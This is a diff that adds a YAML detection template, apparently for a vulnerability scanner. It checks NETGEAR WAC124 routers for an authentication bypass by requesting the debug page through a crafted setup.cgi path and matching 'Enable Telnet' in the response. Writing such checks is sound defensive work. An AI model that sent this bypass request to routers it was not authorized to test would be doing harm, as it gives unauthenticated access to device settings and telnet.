@@ -1,0 +1,30 @@
+id: "netgear-wac124-router-auth-bypass"
+name: "NETGEAR WAC124 - Authentication Bypass"
+severity: "high"
+description: "NETGEAR WAC124 AC2000 routers contain an authentication bypass vulnerability. An attacker can gain access by bypassing proper authentication, thereby making it possible to obtain sensitive information, modify data, and/or execute unauthorized operations."
+tech:
+  - "generic"
+tags:
+  - "netgear"
+  - "auth-bypass"
+  - "router"
+  - "iot"
+  - "vuln"
+cwe: "CWE-287"
+reference: "https://flattsecurity.medium.com/finding-bugs-to-trigger-unauthenticated-command-injection-in-a-netgear-router-psv-2022-0044-2b394fb9edc"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/setup.cgi?next_file=debug.htm&x=currentsetting.htm"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "status"
+    status:
+      - 200
+  - type: "word"
+    part: "body"
+    words:
+      - "Enable Telnet"
